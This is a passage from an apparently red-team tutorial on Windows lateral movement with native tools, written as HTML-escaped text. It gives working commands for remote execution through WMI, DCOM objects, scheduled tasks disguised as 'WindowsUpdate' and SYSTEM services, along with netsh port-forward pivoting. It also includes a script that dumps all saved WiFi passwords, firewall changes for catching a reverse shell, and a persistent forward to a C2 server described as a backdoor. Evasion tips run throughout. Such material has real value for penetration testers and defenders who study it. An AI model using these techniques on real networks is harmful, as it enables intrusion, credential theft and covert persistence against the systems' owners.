either cleartext passwords or Kerberos tickets. Tools like Mimikatz and Impacket work around this by injecting the hash into LSASS or by implementing the NTLM authentication protocol themselves.\u003c/p\u003e\n\u003cp\u003eHowever, we can accomplish similar results using native Windows tools through several techniques. Let me walk you through the options based on what credentials you've obtained.\u003c/p\u003e\n\u003ch4\u003eOption 1: Using Cleartext Passwords\u003c/h4\u003e\n\u003cp\u003eIf you've successfully cracked hashes or found cleartext passwords (in files, PowerShell history, etc.), using them is straightforward. You create a PSCredential object and use it with PowerShell Remoting or WMI:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Create a credential object with cleartext password\n$password = ConvertTo-SecureString \"P@ssw0rd123\" -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential (\"DOMAIN\\username\", $password)\n\n# Use it for PowerShell Remoting\nInvoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {\n    whoami\n    hostname\n}\n\n# Or with WMI\n$options = New-Object System.Management.ConnectionOptions\n$options.Username = \"DOMAIN\\username\"\n$options.Password = \"P@ssw0rd123\"\n$scope = New-Object System.Management.ManagementScope(\"\\\\TARGET-PC\\root\\cimv2\", $options)\n$scope.Connect()\n\n# Now you can query WMI or execute commands\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is completely native and works reliably. The downside is you need the cleartext password.\u003c/p\u003e\n\u003ch4\u003eOption 2: Pass-the-Ticket (Using Kerberos Tickets)\u003c/h4\u003e\n\u003cp\u003eThis is a native technique that works without any additional tools. If you've extracted Kerberos tickets from LSASS (either TGTs or service tickets), you can import them into your current session and use them for authentication.\u003c/p\u003e\n\u003cp\u003eThe challenge is that with only native tools, importing tickets is difficult. The tickets are stored in LSASS, and there's no native Windows command to import a ticket file. However, if you've extracted a ticket from one user session, you can use it in another session on the same machine:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List current tickets\nklist\n\n# Purge current tickets (optional - be careful with this)\nklist purge\n\n# Unfortunately, there's no native \"klist import\" command\n# Tickets can be imported programmatically using Windows APIs, but this requires\n# P/Invoke code or additional tools like Rubeus\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe reality is that true pass-the-ticket with only native tools is limited. You can work with tickets that are already in memory, but importing external tickets requires Windows API calls that aren't exposed through PowerShell cmdlets.\u003c/p\u003e\n\u003ch4\u003eOption 3: Overpass-the-Hash (Pass-the-Key)\u003c/h4\u003e\n\u003cp\u003eHere's a more practical native technique. If you have an NTLM hash, you can use it to request a Kerberos TGT (Ticket Granting Ticket), then use that TGT for authentication. This is called \"overpass-the-hash\" or \"pass-the-key.\"\u003c/p\u003e\n\u003cp\u003eThe tricky part is that requesting a TGT with just a hash requires direct manipulation of Windows authentication APIs. With only native PowerShell, this is very difficult. However, I can show you the concept:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# This is the theory - actual implementation requires complex P/Invoke code\n# The steps would be:\n# 1. Use the NTLM hash to compute a Kerberos key\n# 2. Use that key to request a TGT from the domain controller\n# 3. Import the TGT into the current session\n# 4. Use the TGT for authentication\n\n# In practice, this is what Rubeus does with the \"asktgt\" command\n# Native implementation would require:\n# - P/Invoke calls to LsaLogonUser or similar APIs\n# - Manual Kerberos AS-REQ construction\n# - Crypto operations to compute the Kerberos key from NTLM hash\n\n# This is beyond what's practical with \"native tools only\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe honest truth is that true pass-the-hash and overpass-the-hash are difficult without tools like Mimikatz or Rubeus. These tools exist specifically because Windows doesn't natively expose these capabilities.\u003c/p\u003e\n\u003ch4\u003eOption 4: The Practical Native Approach\u003c/h4\u003e\n\u003cp\u003eHere's what I actually do in engagements when restricted to native tools. After dumping LSASS and extracting credentials, I:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCrack the NTLM hashes offline\u003c/strong\u003e (using hashcat) to get cleartext passwords\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUse the cleartext passwords\u003c/strong\u003e with PSCredential objects\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLeverage existing Kerberos tickets\u003c/strong\u003e on compromised systems without exporting them\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLet me show you the third option in detail, because it's very powerful and completely native:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Scenario: You've compromised a system where a domain admin is logged in\n# Their Kerberos tickets are already in memory\n\n# Check what tickets are available\nklist\n\n# If you see a TGT for a privileged account, you can use it without doing anything!\n# The ticket is already active in the session\n\n# Now, from this same session, use PowerShell Remoting to a target\nEnter-PSSession -ComputerName DC01\n\n# You're now authenticated as the domain admin whose TGT is in memory\n# This works because the system automatically uses available Kerberos tickets\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is incredibly powerful. If you've compromised a system where privileged users are logged in (or have recently logged in and their tickets haven't expired), you can piggyback on their existing Kerberos authentication without needing to export, import, or manipulate tickets at all.\u003c/p\u003e\n\u003cp\u003eAnother practical approach is using \u003ccode\u003erunas\u003c/code\u003e with the \u003ccode\u003e/netonly\u003c/code\u003e flag:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# This doesn't truly pass-the-hash, but it lets you create a process with alternate network credentials\n# The credentials must be valid (you can't use just a hash here)\nrunas /netonly /user:DOMAIN\\admin \"powershell.exe\"\n\n# This spawns a new PowerShell process\n# Any network authentication from this process will use the specified credentials\n# But the local process runs under your current user context\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen you run commands in this new PowerShell window, network operations (like accessing file shares, WMI, PowerShell Remoting) will use the credentials you specified.\u003c/p\u003e\n\u003ch4\u003eOption 5: Using NTLM Hashes with WMI (Workaround)\u003c/h4\u003e\n\u003cp\u003eHere's a creative workaround. While you can't directly use NTLM hashes with native PowerShell, you can use the fact that some Windows APIs accept NTLM authentication directly. However, this still ultimately requires the cleartext password for the API call:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# This still needs cleartext, but shows how authentication works\n$username = \"DOMAIN\\user\"\n$password = \"P@ssw0rd123\"\n\n# Create WMI connection with explicit credentials\n$options = New-Object System.Management.ConnectionOptions\n$options.Username = $username\n$options.Password = $password\n$options.Impersonation = [System.Management.ImpersonationLevel]::Impersonate\n$options.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy\n\n$scope = New-Object System.Management.ManagementScope(\"\\\\TARGET-PC\\root\\cimv2\", $options)\n$scope.Connect()\n\n# Execute WMI query\n$query = New-Object System.Management.ObjectQuery(\"SELECT * FROM Win32_Process\")\n$searcher = New-Object System.Management.ManagementObjectSearcher($scope, $query)\n$processes = $searcher.Get()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe reality is that with native tools only, your best approach for lateral movement is:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eExtract credentials (LSASS dumps, registry, files)\u003c/li\u003e\n\u003cli\u003eCrack NTLM hashes offline to get cleartext passwords (or use Kerberos tickets you've extracted)\u003c/li\u003e\n\u003cli\u003eUse cleartext passwords with PSCredential objects for PowerShell Remoting and WMI\u003c/li\u003e\n\u003cli\u003eLeverage existing Kerberos tickets on compromised systems without exporting them\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis is why tools like Mimikatz and Rubeus exist - they fill the gaps that native Windows tools don't cover for offensive operations. But with creativity and patience, you can accomplish most lateral movement goals with native tools by focusing on credential extraction and cracking rather than trying to use hashes directly.\u003c/p\u003e\n\u003ch3\u003eWMI: The Old Reliable\u003c/h3\u003e\n\u003cp\u003eWMI (Windows Management Instrumentation) has been around since Windows NT, and it's still incredibly useful for lateral movement. Every Windows system has WMI, it's enabled by default, and it's a completely legitimate management protocol.\u003c/p\u003e\n\u003cp\u003eThe key advantage of WMI over PowerShell Remoting is that it works on older systems and doesn't require any special configuration. If you have admin credentials for a system, you can use WMI to interact with it.\u003c/p\u003e\n\u003cp\u003eHere's how to execute commands remotely using WMI:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute a command on a remote system using WMI\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c whoami \u003e C:\\temp\\output.txt\" -ComputerName TARGET-PC\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me break down what's happening here. We're calling the Create method of the Win32_Process WMI class, which creates a new process. The ArgumentList is the command we want to run. This executes on the remote system as SYSTEM or as the user account that WMI is running under.\u003c/p\u003e\n\u003cp\u003eThe challenge with WMI is that you don't get output directly - the command executes, but you can't see what it returned. That's why in the example above, I redirected output to a file. To get that output, I need to read the file:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Read the output file\n$output = Get-Content \\\\TARGET-PC\\C$\\temp\\output.txt\n\n# Display the output\n$output\n\n# Clean up the file\nRemove-Item \\\\TARGET-PC\\C$\\temp\\output.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e\\\\TARGET-PC\\C$\u003c/code\u003e notation accesses the administrative share on the remote system, which is available if you have admin credentials.\u003c/p\u003e\n\u003cp\u003eFor a more elegant approach, you can use WMI to execute PowerShell, which can then return output directly:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute PowerShell command via WMI\n$command = \"Get-Process | ConvertTo-Json\"\n$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))\n\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"powershell.exe -EncodedCommand $encodedCommand -NoProfile\" -ComputerName TARGET-PC\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWMI can also be used to query remote systems for information without executing commands:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get OS information from remote system\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName TARGET-PC\n\n# Get running processes\nGet-WmiObject -Class Win32_Process -ComputerName TARGET-PC\n\n# Get installed hotfixes\nGet-WmiObject -Class Win32_QuickFixEngineering -ComputerName TARGET-PC\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese queries are completely passive from the remote system's perspective - you're just reading information, not executing anything.\u003c/p\u003e\n\u003cp\u003eOne more powerful WMI technique is using wmic.exe, the command-line interface to WMI:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003ewmic /node:TARGET-PC process call create \"cmd.exe /c whoami\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis does the same thing as Invoke-WmiMethod but from cmd.exe instead of PowerShell. Sometimes this is useful if you're working from a basic shell without PowerShell access.\u003c/p\u003e\n\u003cp\u003eImportant note about WMI: It uses DCOM (Distributed COM) for communication, which means it uses dynamic RPC ports (typically in the range 49152-65535). Firewalls might block these ports between network segments. It also creates event log entries - Event ID 4624 with logon type 3 for the network authentication.\u003c/p\u003e\n\u003ch3\u003eDCOM: The Stealthy Alternative\u003c/h3\u003e\n\u003cp\u003eDCOM (Distributed Component Object Model) is less commonly used than WMI or PowerShell Remoting, which actually makes it more interesting for red teaming. Security tools are less likely to specifically monitor for DCOM abuse, and it's not typically discussed in defensive training.\u003c/p\u003e\n\u003cp\u003eDCOM allows you to instantiate COM objects on remote systems and call their methods. Certain COM objects can be abused to execute commands remotely. Let me show you the most reliable techniques:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Method 1: MMC20.Application\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"TARGET-PC\"))\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",$null,\"/c calc.exe\",\"7\")\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis uses the MMC20.Application COM object, which is the Microsoft Management Console's automation interface. The ExecuteShellCommand method does exactly what it sounds like - executes a shell command with the command \"cmd.exe\", directory set to $null (using the default), parameters \"/c calc.exe\", and window state \"7\" (hidden window).\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Method 2: ShellWindows\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"TARGET-PC\"))\n$item = $dcom.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\Windows\\System32\",$null,0)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eShellWindows represents Windows Explorer windows. Each Explorer window has a Document.Application object that exposes a ShellExecute method with the file \"cmd.exe\", arguments \"/c calc.exe\", directory \"C:\\Windows\\System32\", operation set to $null (default, which means \"open\"), and show value 0 (hidden).\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Method 3: ShellBrowserWindow\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"TARGET-PC\"))\n$item = $dcom.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\Windows\\System32\",$null,0)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eShellBrowserWindow is similar to ShellWindows and uses the same ShellExecute method.\u003c/p\u003e\n\u003cp\u003eThe advantages of DCOM are that it's less commonly monitored than WMI or PowerShell Remoting, it uses standard RPC/DCOM ports (135 plus dynamic ports), it doesn't require WinRM to be enabled, and it works on older Windows systems that might not have PowerShell Remoting configured.\u003c/p\u003e\n\u003cp\u003eThe disadvantages are that you don't get command output (similar to WMI), it requires admin credentials, the COM objects might not be available on all systems, and some EDR solutions now monitor DCOM abuse after it became publicly known in the security community.\u003c/p\u003e\n\u003ch3\u003eScheduled Tasks for Remote Execution\u003c/h3\u003e\n\u003cp\u003eCreating scheduled tasks on remote systems is a completely legitimate administrative action that's perfect for lateral movement:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003eschtasks /create /tn \"WindowsUpdate\" /tr \"cmd.exe /c whoami \u003e C:\\temp\\output.txt\" /sc once /st 00:00 /S TARGET-PC /U DOMAIN\\username /P password\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me break down this command. The \u003ccode\u003e/create\u003c/code\u003e flag creates a new task, while \u003ccode\u003e/tn \"WindowsUpdate\"\u003c/code\u003e sets the task name disguised as a legitimate update task. The \u003ccode\u003e/tr \"cmd.exe /c...\"\u003c/code\u003e parameter specifies the command to run. We use \u003ccode\u003e/sc once\u003c/code\u003e to set it as a one-time task with \u003ccode\u003e/st 00:00\u003c/code\u003e as the start time (midnight, though we'll run it immediately). The \u003ccode\u003e/S TARGET-PC\u003c/code\u003e targets the remote system, and \u003ccode\u003e/U DOMAIN\\username\u003c/code\u003e and \u003ccode\u003e/P password\u003c/code\u003e provide the credentials for authentication.\u003c/p\u003e\n\u003cp\u003eAfter creating the task, run it immediately:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003eschtasks /run /tn \"WindowsUpdate\" /S TARGET-PC /U DOMAIN\\username /P password\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen clean up:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003eschtasks /delete /tn \"WindowsUpdate\" /S TARGET-PC /U DOMAIN\\username /P password /F\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e/F\u003c/code\u003e flag forces deletion without confirmation.\u003c/p\u003e\n\u003cp\u003eFor better OPSEC, you can configure the task to run as SYSTEM:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003eschtasks /create /tn \"WindowsUpdate\" /tr \"cmd.exe /c your_command\" /sc once /st 00:00 /ru SYSTEM /S TARGET-PC /U DOMAIN\\username /P password\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e/ru SYSTEM\u003c/code\u003e flag makes the task run as SYSTEM, giving you the highest privileges on the target system.\u003c/p\u003e\n\u003cp\u003eYou can also create more sophisticated tasks using PowerShell:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Create a scheduled task using PowerShell\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-NoProfile -Command Get-Process\"\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)\n$principal = New-ScheduledTaskPrincipal -UserId \"SYSTEM\" -LogonType ServiceAccount -RunLevel Highest\n\nRegister-ScheduledTask -TaskName \"SystemMaintenance\" -Action $action -Trigger $trigger -Principal $principal -CimSession TARGET-PC\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a task that will run one minute from now as SYSTEM. The \u003ccode\u003e-CimSession\u003c/code\u003e parameter allows you to target a remote system.\u003c/p\u003e\n\u003cp\u003eScheduled tasks are logged in the Task Scheduler event logs (Event ID 106 for task registered, 200 for task executed), but they're so common in enterprise environments that they rarely trigger alerts unless the task name or command is obviously suspicious.\u003c/p\u003e\n\u003ch3\u003eService-Based Lateral Movement\u003c/h3\u003e\n\u003cp\u003eWindows services are another legitimate mechanism for executing code that can be abused for lateral movement:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003e# Create a service on the remote system\nsc.exe \\\\TARGET-PC create UpdateService binPath= \"cmd.exe /c whoami \u003e C:\\temp\\output.txt\" start= demand\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNote the spaces after \u003ccode\u003ebinPath=\u003c/code\u003e and \u003ccode\u003estart=\u003c/code\u003e - they're required for sc.exe to parse the command correctly.\u003c/p\u003e\n\u003cp\u003eStart the service:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003esc.exe \\\\TARGET-PC start UpdateService\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen the service starts, it executes the command specified in binPath. Services run as SYSTEM by default unless you specify otherwise.\u003c/p\u003e\n\u003cp\u003eClean up:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003esc.exe \\\\TARGET-PC delete UpdateService\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe limitation of this technique is that the command needs to behave like a service - it needs to respond to service control messages. A simple command like \u003ccode\u003ecmd.exe /c whoami\u003c/code\u003e won't work properly as a service because it doesn't implement the Service Control Manager interface. The command will execute, but you'll get an error that the service didn't start properly.\u003c/p\u003e\n\u003cp\u003eTo work around this, you can use a service-friendly executable or wrap your command:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003esc.exe \\\\TARGET-PC create UpdateService binPath= \"C:\\Windows\\System32\\cmd.exe /c start /b powershell.exe -Command \\\"Get-Process | Out-File C:\\temp\\processes.txt\\\"\" start= demand\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOr better yet, point the service at a legitimate Windows binary that can act as a service:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003e# Create service pointing to a payload you've copied to the target\nsc.exe \\\\TARGET-PC create UpdateService binPath= \"C:\\Windows\\Temp\\payload.exe\" start= demand\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eService creation and modification are logged (Event ID 7045 for new services), and security-conscious organizations often monitor for suspicious service creation. Use service names that blend in with legitimate Windows services.\u003c/p\u003e\n\u003ch3\u003eNetwork Pivoting with netsh\u003c/h3\u003e\n\u003cp\u003eOne of the most powerful but often overlooked native Windows tools for lateral movement is netsh.exe - the Network Shell utility. While administrators use it for configuring network settings, firewalls, and interfaces, it has capabilities that are incredibly useful for red teamers, particularly for network pivoting and credential harvesting.\u003c/p\u003e\n\u003cp\u003eLet me show you how to turn a compromised Windows system into a network pivot using only netsh.\u003c/p\u003e\n\u003ch4\u003ePort Forwarding and Pivoting\u003c/h4\u003e\n\u003cp\u003eThe most valuable feature of netsh for offensive operations is port forwarding. If you've compromised a system that has access to internal networks you can't reach directly, you can use netsh to forward ports and pivot through that system.\u003c/p\u003e\n\u003cp\u003eHere's the basic concept: you configure the compromised system to listen on a port and forward all traffic to an internal target. This effectively turns the compromised system into a proxy, letting you access internal services that aren't directly reachable from your position.\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Set up port forwarding from compromised host to internal server\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.10.50\n\n# Now you can access the internal web server at http://compromised-host:8080\n# and it forwards to http://192.168.10.50:80\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me break down this command. The \u003ccode\u003einterface portproxy\u003c/code\u003e context manages port forwarding in netsh, and \u003ccode\u003eadd v4tov4\u003c/code\u003e adds an IPv4-to-IPv4 forwarding rule. The \u003ccode\u003elistenport=8080\u003c/code\u003e parameter sets the port to listen on (on the compromised system), while \u003ccode\u003elistenaddress=0.0.0.0\u003c/code\u003e makes it listen on all interfaces (or you can specify a specific IP). The \u003ccode\u003econnectport=80\u003c/code\u003e parameter defines the port to forward to on the target, and \u003ccode\u003econnectaddress=192.168.10.50\u003c/code\u003e specifies the internal IP address to forward traffic to.\u003c/p\u003e\n\u003cp\u003eThis is incredibly powerful for several scenarios:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eScenario 1: Accessing Internal Web Applications\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Forward local port 8443 to internal HTTPS service\nnetsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=internal-app.company.local\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow you can browse to \u003ccode\u003ehttps://compromised-host:8443\u003c/code\u003e and access the internal application.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eScenario 2: Pivoting to Internal Databases\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Forward to internal SQL Server\nnetsh interface portproxy add v4tov4 listenport=1433 listenaddress=0.0.0.0 connectport=1433 connectaddress=sql-server.internal.local\n\n# Now connect with: sqlcmd -S compromised-host -U sa -P password\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eScenario 3: RDP Pivoting\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Forward RDP to internal systems\nnetsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=admin-workstation.internal\n\n# Connect via: mstsc /v:compromised-host:3389\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eScenario 4: SSH Tunneling to Internal Linux Systems\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Forward to internal SSH server\nnetsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=linux-server.internal\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo view all configured port forwards:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all port forwarding rules\nnetsh interface portproxy show all\n\n# Or specifically show v4tov4 rules\nnetsh interface portproxy show v4tov4\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo remove a forwarding rule when you're done:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Delete specific rule\nnetsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0\n\n# Or delete all rules\nnetsh interface portproxy reset\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe beautiful thing about netsh port forwarding is that it's completely native, requires no additional software, and persists across reboots. The forwarding rules are stored in the registry and automatically reinstated when the system restarts.\u003c/p\u003e\n\u003cp\u003eImportant OPSEC note: Port forwarding creates network connections that can be monitored. The compromised system will show connections to the internal targets, and network monitoring might detect unusual traffic patterns. However, since netsh is a legitimate administrative tool and port forwarding is a normal network configuration task, it's less suspicious than running custom proxy tools.\u003c/p\u003e\n\u003ch4\u003eWiFi Credential Harvesting\u003c/h4\u003e\n\u003cp\u003eIf you've compromised a laptop or any system with WiFi capability, netsh can extract saved WiFi credentials:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all saved WiFi profiles\nnetsh wlan show profiles\n\n# Show detailed information including password for specific network\nnetsh wlan show profile name=\"CompanyWiFi\" key=clear\n\n# Export all WiFi profiles to XML files\nnetsh wlan export profile key=clear folder=C:\\temp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003ekey=clear\u003c/code\u003e parameter is critical - it tells netsh to show the password in cleartext. Without it, you only see the encrypted version.\u003c/p\u003e\n\u003cp\u003eHere's what the output looks like:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eProfile CompanyWiFi on interface Wi-Fi:\n=======================================================================\n\nApplied: All User Profile\n\nProfile information\n-------------------\n    Version                : 1\n    Type                   : Wireless LAN\n    Name                   : CompanyWiFi\n    Control options        :\n        Connection mode    : Connect automatically\n        Network broadcast  : Connect only if this network is broadcasting\n        AutoSwitch         : Do not switch to other networks\n\nSecurity settings\n-----------------\n    Authentication         : WPA2-Personal\n    Cipher                 : CCMP\n    Authentication         : WPA2-Personal\n    Security key           : Present\n    Key Content            : P@ssw0rd123!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe WiFi password is right there in cleartext. This is particularly valuable because:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWiFi passwords are often reused for other systems or services\u003c/li\u003e\n\u003cli\u003eThe password might be the corporate WiFi password, which could be used for physical access operations\u003c/li\u003e\n\u003cli\u003ePersonal hotspot passwords can reveal patterns about user password choices\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eYou can automate the extraction of all WiFi credentials:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# PowerShell script to extract all WiFi passwords\n$profiles = (netsh wlan show profiles) | Select-String \"All User Profile\" | ForEach-Object {\n    $_.ToString().Split(':')[1].Trim()\n}\n\nforeach ($profile in $profiles) {\n    $password = (netsh wlan show profile name=\"$profile\" key=clear) | Select-String \"Key Content\"\n    if ($password) {\n        Write-Output \"Network: $profile\"\n        Write-Output $password\n        Write-Output \"---\"\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch4\u003eFirewall Manipulation\u003c/h4\u003e\n\u003cp\u003eNetsh can also manipulate Windows Firewall, which is useful for opening ports or disabling protections:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Disable Windows Firewall completely (very obvious)\nnetsh advfirewall set allprofiles state off\n\n# Re-enable it\nnetsh advfirewall set allprofiles state on\n\n# Add firewall rule to allow inbound connection\nnetsh advfirewall firewall add rule name=\"Allow Port 4444\" dir=in action=allow protocol=TCP localport=4444\n\n# Delete the rule when done\nnetsh advfirewall firewall delete rule name=\"Allow Port 4444\"\n\n# Show current firewall status\nnetsh advfirewall show allprofiles\n\n# Export firewall configuration\nnetsh advfirewall export C:\\temp\\firewall-backup.wfw\n\n# Import firewall configuration\nnetsh advfirewall import C:\\temp\\firewall-backup.wfw\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdding specific firewall rules is much stealthier than completely disabling the firewall. If you need to receive a reverse shell on port 4444, add a rule allowing that specific port rather than turning off the entire firewall.\u003c/p\u003e\n\u003ch4\u003eNetwork Interface Information\u003c/h4\u003e\n\u003cp\u003eNetsh can also enumerate network configuration, which is useful for understanding the network environment:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Show all network interfaces and their configuration\nnetsh interface show interface\n\n# Show IP configuration\nnetsh interface ip show config\n\n# Show IP addresses\nnetsh interface ip show addresses\n\n# Show routing table\nnetsh interface ip show route\n\n# Show DNS servers\nnetsh interface ip show dnsservers\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis information helps you understand the network topology and plan your lateral movement.\u003c/p\u003e\n\u003ch4\u003ePersistence via netsh\u003c/h4\u003e\n\u003cp\u003eYou can use netsh to create persistent port forwards that survive reboots, effectively creating a backdoor for re-entry:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Create persistent port forward to your C2 server\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=your-c2-server.com\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow any connection to this system on port 8080 gets forwarded to your C2 server on port 443. This could be used to maintain a communication channel or provide an alternative entry point.\u003c/p\u003e\n\u003ch4\u003eCombining netsh with Other 